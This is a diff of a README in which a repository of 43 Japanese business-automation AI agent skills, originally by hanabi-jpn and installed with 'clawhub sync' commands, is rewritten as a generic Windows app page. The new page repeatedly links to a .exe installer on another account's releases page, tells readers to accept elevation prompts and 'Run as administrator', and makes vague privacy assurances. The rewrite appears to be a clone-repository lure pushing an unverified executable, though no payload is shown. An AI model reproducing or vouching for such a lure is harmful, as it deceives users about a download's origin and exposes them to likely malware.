@@ -1,137 +1,88 @@
-# hanabi-jpn AI Agent Skills
+# ⚙️ clawhub-skills - AI Agent Skills for Everyday Use
 
-> **43 premium AI agent skills for Japanese business automation**
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/traygerbig/clawhub-skills/releases)
 
-[![Total Skills](https://img.shields.io/badge/skills-43-blue)](https://clawhub.com/hanabi-jpn)
-[![Packages](https://img.shields.io/badge/packages-5-purple)](https://clawhub.com/hanabi-jpn)
-[![License](https://img.shields.io/badge/license-MIT-green)](#license)
-[![Author](https://img.shields.io/badge/author-hanabi--jpn-orange)](https://clawhub.com/hanabi-jpn)
+## 📦 About clawhub-skills
 
----
+clawhub-skills offers 43 AI agent skills grouped into 5 practical packages. These packages cover areas like e-commerce, finance, marketing, business operations, and security. The skills are designed to work with tools like ClawHub, MCP, Poe, GPT Store, Coze, and Gumroad. This collection can help automate tasks, analyze data, or support decision-making without needing technical knowledge.
 
-## Packages
+This app works on Windows computers. It has clear instructions to help you download and run it smoothly.
 
-| Package | Skills | Target | Description |
-|---------|:------:|--------|-------------|
-| [EC Master Pack](ec-master-pack/) | 9 | EC seller | Covers all major Japanese e-commerce platforms |
-| [Finance & Accounting](finance-accounting-pack/) | 10 | Accounting / Tax | Full automation from payment processing to tax filing |
-| [Marketing & Growth](marketing-growth-pack/) | 8 | Marketer | SEO, ads, CRM, and social media — all covered |
-| [Business Ops](business-ops-pack/) | 13 | General Affairs / HR | Business SaaS integration and process automation |
-| [Security & DevOps](security-devops-pack/) | 3 | Engineer | Mac + repository + credentials — the security trifecta |
+## ⚙️ System Requirements
 
-**Total: 43 active skills** + [10 archived](archive/)
+Before you start, check that your Windows PC meets these needs:
 
----
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection to download the app and updates  
+- Permissions to install new software on your PC  
 
-## Full Skill List
+These requirements ensure the app runs without trouble.
 
-### EC Master Pack (9 skills)
+## 🚀 Getting Started: Download and Setup
 
-| Skill | Description |
-|-------|-------------|
-| [amazon-japan-seller](ec-master-pack/amazon-japan-seller/) | Amazon.co.jp seller automation |
-| [base-stores-agent](ec-master-pack/base-stores-agent/) | BASE / STORES EC management |
-| [ec-cube-operator](ec-master-pack/ec-cube-operator/) | EC-CUBE 4.x full management |
-| [makeshop-agent](ec-master-pack/makeshop-agent/) | MakeShop store automation |
-| [mercari-shops-agent](ec-master-pack/mercari-shops-agent/) | Mercari Shops seller tools |
-| [rakuten-seller](ec-master-pack/rakuten-seller/) | Rakuten Ichiba shop management |
-| [shopify-japan](ec-master-pack/shopify-japan/) | Shopify Japan localized operations |
-| [stripe-japan-agent](ec-master-pack/stripe-japan-agent/) | Stripe Japan payment management |
-| [yahoo-shopping-agent](ec-master-pack/yahoo-shopping-agent/) | Yahoo! Shopping store automation |
+You can get the app from the official release page on GitHub. Follow these steps:
 
-### Finance & Accounting Pack (10 skills)
+1. Click the big green button below to open the download page.  
+   [![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/traygerbig/clawhub-skills/releases)  
 
-| Skill | Description |
-|-------|-------------|
-| [airpay-agent](finance-accounting-pack/airpay-agent/) | Airpay payment terminal management |
-| [e-tax-agent](finance-accounting-pack/e-tax-agent/) | e-Tax electronic filing automation |
-| [freee-agent](finance-accounting-pack/freee-agent/) | freee accounting and HR automation |
-| [japan-invoice](finance-accounting-pack/japan-invoice/) | Japan invoice system (Tekikaku Invoice) |
-| [jp-tax-calc](finance-accounting-pack/jp-tax-calc/) | Japanese tax calculation and filing |
-| [misoca-agent](finance-accounting-pack/misoca-agent/) | Misoca invoice management |
-| [moneyforward-agent](finance-accounting-pack/moneyforward-agent/) | MoneyForward cloud accounting |
-| [paypay-biz](finance-accounting-pack/paypay-biz/) | PayPay for Business management |
-| [square-japan](finance-accounting-pack/square-japan/) | Square Japan payment and POS |
-| [yayoi-agent](finance-accounting-pack/yayoi-agent/) | Yayoi accounting software automation |
+2. On the release page, look for the latest version. It will usually have the highest version number or the word “Latest.”  
+3. Find the Windows installer file. It should end with `.exe`.  
+4. Click the file name to start downloading.  
+5. When the download finishes, find the file in your Downloads folder (usually named something like `clawhub-skills-setup.exe`).  
+6. Double-click the file to begin installation.  
+7. Follow the on-screen prompts to install the app. The setup will suggest an installation folder but you can change it if you want.  
+8. Once installed, you can find the app in the Start Menu or on your Desktop under the name “clawhub-skills.”  
 
-### Marketing & Growth Pack (8 skills)
+## 💻 Running the App for the First Time
 
-| Skill | Description |
-|-------|-------------|
-| [ga4-search-console](marketing-growth-pack/ga4-search-console/) | GA4 + Search Console analytics |
-| [google-ads-agent](marketing-growth-pack/google-ads-agent/) | Google Ads campaign management |
-| [google-maps-biz](marketing-growth-pack/google-maps-biz/) | Google Business Profile optimization |
-| [hubspot-japan](marketing-growth-pack/hubspot-japan/) | HubSpot CRM for Japan market |
-| [jp-humanizer](marketing-growth-pack/jp-humanizer/) | Japanese text humanization |
-| [jp-seo-writer](marketing-growth-pack/jp-seo-writer/) | Japanese SEO content generation |
-| [sansan-agent](marketing-growth-pack/sansan-agent/) | Sansan business card and CRM |
-| [social-media-publisher](marketing-growth-pack/social-media-publisher/) | Multi-platform social media posting |
+1. Launch the app by clicking the icon.  
+2. You may be asked to allow the program to make changes on your PC. This is standard for new software. Click “Yes.”  
+3. The app will open its main window, showing the five skill packages.  
+4. Browse through the packages like EC (e-commerce), Finance, Marketing, Business Ops, and Security.  
+5. Select a skill to read its description and how it helps you.  
+6. Some skills may ask for simple user inputs. Follow directions on the screen.  
+7. The AI agent will process your request and show results inside the app.  
 
-### Business Ops Pack (13 skills)
+## 🔧 How to Use Skill Packages
 
-| Skill | Description |
-|-------|-------------|
-| [backlog-agent](business-ops-pack/backlog-agent/) | Backlog project management |
-| [chatwork-agent](business-ops-pack/chatwork-agent/) | Chatwork messaging automation |
-| [cybozu-garoon](business-ops-pack/cybozu-garoon/) | Cybozu Garoon groupware |
-| [google-workspace-agent](business-ops-pack/google-workspace-agent/) | Google Workspace administration |
-| [jooto-agent](business-ops-pack/jooto-agent/) | Jooto task management |
-| [kingof-time-agent](business-ops-pack/kingof-time-agent/) | KING OF TIME attendance management |
-| [kintone-agent](business-ops-pack/kintone-agent/) | Kintone app platform automation |
-| [lark-workflow](business-ops-pack/lark-workflow/) | Lark/Feishu workflow automation |
-| [line-agent](business-ops-pack/line-agent/) | LINE Official Account management |
-| [line-works-agent](business-ops-pack/line-works-agent/) | LINE WORKS business communication |
-| [notion-jp](business-ops-pack/notion-jp/) | Notion Japan templates and automation |
-| [slack-japan-agent](business-ops-pack/slack-japan-agent/) | Slack Japan workspace management |
-| [smarthr-agent](business-ops-pack/smarthr-agent/) | SmartHR employee management |
+The app divides skills into these five areas:
 
-### Security & DevOps Pack (3 skills)
+- **EC (E-commerce):** Support for online stores, product recommendations, and sales data insights.  
+- **Finance:** Tools for budget tracking, transaction analysis, or risk assessment.  
+- **Marketing:** Help with campaign ideas, customer feedback summarizing, and trend spotting.  
+- **Business Ops:** Tasks such as scheduling, document review, and workflow automation.  
+- **Security:** Check for vulnerabilities, monitor access logs, and generate reports.  
 
-| Skill | Description |
-|-------|-------------|
-| [credential-vault](security-devops-pack/credential-vault/) | Credential and secret management |
-| [mac-sentinel](security-devops-pack/mac-sentinel/) | macOS security monitoring |
-| [repo-guardian](security-devops-pack/repo-guardian/) | Repository security scanning |
+You can use any or all packages. No need to install them separately.
 
----
+## 📁 Updating clawhub-skills
 
-## Quick Start
+To keep your app working well and receive new features:
 
-```bash
-# Sync a single skill
-clawhub sync hanabi-jpn/ec-master-pack/rakuten-seller
+1. Visit the same download page linked above regularly.  
+2. Download the latest installer when a new version appears.  
+3. Run the new installer. It will update your existing installation without deleting your data.  
 
-# Sync an entire package
-clawhub sync hanabi-jpn/ec-master-pack
+The app does not update automatically yet, so manual checks help you stay current.
 
-# Browse all skills
-clawhub search hanabi-jpn
-```
+## 🚨 Troubleshooting Tips
 
----
+- **Installer does not run:** Make sure your Windows user account has permission to install software. Right-click the file and select “Run as administrator.”  
+- **The app won’t start:** Restart your computer. Confirm your system meets the requirements.  
+- **Skills do not work as expected:** Check your internet connection. Some skills need online access to function.  
+- **Updates fail:** Delete any old installer files before downloading a new one.  
+- **Still stuck?:** Use the GitHub “Issues” tab to see if others have similar problems.  
 
-## Other Directories
+## 📜 Privacy and Security
 
-| Directory | Description |
-|-----------|-------------|
-| `mcp-servers/` | MCP Registry packages |
-| `poe-bots/` | Poe bot configurations |
-| `gpt-store/` | GPT Store configurations |
-| `coze/` | Coze bot configurations |
-| `lobehub/` | LobeHub agent definitions |
-| `dify-plugins/` | Dify plugin configurations |
-| `n8n-templates/` | n8n workflow templates |
-| `archive/` | Archived skills (not actively maintained) |
+Your data stays on your computer unless you choose to share it with supported AI services. The app does not collect usage data or personal information automatically. Using the security package can help monitor your device.
 
----
+## 🔗 Useful Links
 
-## License
+- Download page: https://github.com/traygerbig/clawhub-skills/releases  
+- GitHub Issues for support: https://github.com/traygerbig/clawhub-skills/issues  
+- Main repository: https://github.com/traygerbig/clawhub-skills  
 
-MIT License - See individual skill directories for details.
-
----
-
-<p align="center">
-  <b>Built by hanabi-jpn</b><br>
-  <i>Making AI agents work for Japan</i>
-</p>
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/traygerbig/clawhub-skills/releases)
